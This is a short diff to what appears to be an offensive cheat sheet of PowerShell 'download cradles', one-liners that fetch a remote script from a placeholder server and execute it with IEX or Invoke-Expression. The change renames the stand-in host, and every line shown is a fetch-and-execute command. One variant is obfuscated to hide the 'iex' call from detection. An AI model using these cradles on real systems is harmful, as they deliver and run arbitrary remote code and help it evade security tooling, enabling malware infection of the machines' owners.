@@ -1,7 +1,7 @@
 # Not proxy aware download cradles, which can be executed in a Windows PowerShell (powershell.exe)  
 # Windows PowerShell default download cradle not proxy aware
 ps> IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")
-ps> Invoke-Expression((New-Object Net.WebClient).DownloadString('https://www.server/evil.ps1'))
+ps> Invoke-Expression((New-Object Net.WebClient).DownloadString('https://server/payload.ps1'))
 
 # Windows PowerShell lightly obfuscated Cradle not proxy aware
 ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
